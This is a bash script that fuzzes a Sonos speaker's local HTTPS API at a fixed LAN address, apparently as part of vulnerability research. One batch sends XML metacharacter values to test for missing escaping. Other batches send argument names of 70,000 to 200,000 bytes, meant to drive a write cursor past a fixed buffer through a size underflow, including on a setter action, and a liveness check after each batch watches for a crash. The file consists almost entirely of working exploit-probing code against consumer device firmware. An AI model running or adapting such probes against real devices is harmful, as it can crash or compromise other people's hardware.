#!/usr/bin/env bash
# jc7 — the two latent weaknesses from findings2 §8, on the wire.
# T1: no XML escaping — do metacharacter values change the device's verdict?
# T2: size under-request (2*len(value)+16 requested vs 2*len(name)+len(value)+6 needed) —
#     long names walk the cursor past the 34148 inline buffer and the grow-check underflows.
# Oracle: GetString TAKES an argument, so its rc is the only signal that the body arrived.
# (GetZoneAttributes ignores args and 200s on anything, so it proves nothing.)
set -u
IP=${IP:-192.168.4.86}
U=${U:-RINCON_7828CA9221DC01400}
OUT=${OUT:-recon/jc7/wirefuzz4.tsv}
BODY=/tmp/jc7_t.json
SPACING=${SPACING:-3}

[ -f "$OUT" ] || printf 'ts\tbatch\tcase\troute\tstatus\tbytes\trc\terrorCode\n' > "$OUT"

alive() { curl -s -m 4 -o /dev/null -w '%{http_code}' "http://$IP:1400/status/VERSION"; }
https_ok() { curl -sk -m 4 -o /dev/null -w '%{http_code}' "https://$IP:1443/api/v1/players/$U/info"; }

fire() { # fire <batch> <case> <route> <bodyfile>
  local b=$1 c=$2 r=$3 f=$4
  local code; code=$(curl -sk -m 15 -o /tmp/jc7_t.out -w '%{http_code}' --http1.1 -X POST \
      -H 'X-Sonos-Api-Key: x' -H 'Content-Type: application/json' \
      --data-binary "@$f" "https://$IP:1443/api/v1/players/$U/$r")
  local bytes; bytes=$(wc -c < /tmp/jc7_t.out 2>/dev/null | tr -d ' ' || echo 0)
  local rc; rc=$(grep -o 'return code [0-9]*' /tmp/jc7_t.out 2>/dev/null | head -1 | awk '{print $3}')
  local ec; ec=$(grep -o '"errorCode":"[A-Z_]*"' /tmp/jc7_t.out 2>/dev/null | head -1 | cut -d'"' -f4)
  printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
    "$(date -u +%H:%M:%S)" "$b" "$c" "$r" "$code" "$bytes" "${rc:--}" "${ec:--}" >> "$OUT"
  printf '%-4s %-30s %-22s %s %sB rc=%s %s\n' "$b" "$c" "$r" "$code" "$bytes" "${rc:--}" "${ec:--}"
  sleep "$SPACING"
}

batch_end() {
  local b=$1 st hs
  st=$(alive); hs=$(https_ok)
  printf '%s\t%s\tBATCH_END\t-\t%s\t-\t%s\t%s\n' "$(date -u +%H:%M:%S)" "$b" "$st" "$hs" \
    "$([ "$st" = 200 ] && echo alive || echo DEAD)" >> "$OUT"
  printf -- '--- %s end: icmp/http %s, :1443 %s\n' "$b" "$st" "$hs"
}

# ---- T1: XML metacharacters in an argument value ---------------------------
# Baseline first: a plain value must give the same rc as the metacharacter cases for the
# comparison to mean anything.
for v in 'ZoneName' '<x>' 'a&b' 'a&b;c' '"q"' "'q'" '<a/>' ']]>' '&#0;' '<' 'a<b>c&d"e' 'a	b'; do
  python3 -c "import json,sys;open('$BODY','w').write(json.dumps({'method':'GetString','args':{'StringVariable':sys.argv[1]}}))" "$v"
  fire T1 "value=$(printf '%q' "$v" | cut -c1-26)" upnpSystemProperties "$BODY"
done
batch_end T1

# ---- T2: long name + 1-byte value, rising arg count ------------------------
# Each write requests 2*1+16 = 18 B but needs 2*70000+1+6 = 140007 B, so the cursor is
# advanced ~140 kB per arg. With the grow-check underflowed the buffer never grows.
for n in 1 2 3 5 10; do
  python3 -c "
import json
n=$n
args={('N%05d'%i)+'A'*69995:'x' for i in range(n)}
open('$BODY','w').write(json.dumps({'method':'GetString','args':args}))"
  fire T2 "name70000-value1-x$n" upnpSystemProperties "$BODY"
done
# control: short names, same counts (should match the baseline rc)
for n in 1 5; do
  python3 -c "
import json
n=$n
args={'N%05d'%i:'x' for i in range(n)}
open('$BODY','w').write(json.dumps({'method':'GetString','args':args}))"
  fire T2 "control-shortname-x$n" upnpSystemProperties "$BODY"
done
# 200 kB names, 5 args
python3 -c "
import json
args={('N%05d'%i)+'A'*199995:'x' for i in range(5)}
open('$BODY','w').write(json.dumps({'method':'GetString','args':args}))"
fire T2 name200000-value1-x5 upnpSystemProperties "$BODY"
batch_end T2

# ---- T3: same shapes on the setter (a real action, not a getter) -----------
python3 -c "
import json
args={('N%05d'%i)+'A'*69995:'x' for i in range(5)}
open('$BODY','w').write(json.dumps({'method':'SetZoneAttributes','args':args}))"
fire T3 setter-name70000-x5 upnpDeviceProperties "$BODY"
python3 -c "import json;open('$BODY','w').write(json.dumps({'method':'SetZoneAttributes','args':{'DesiredZoneName':'a&b<c>'}}))"
fire T3 setter-metachars upnpDeviceProperties "$BODY"
batch_end T3

echo "done -> $OUT"
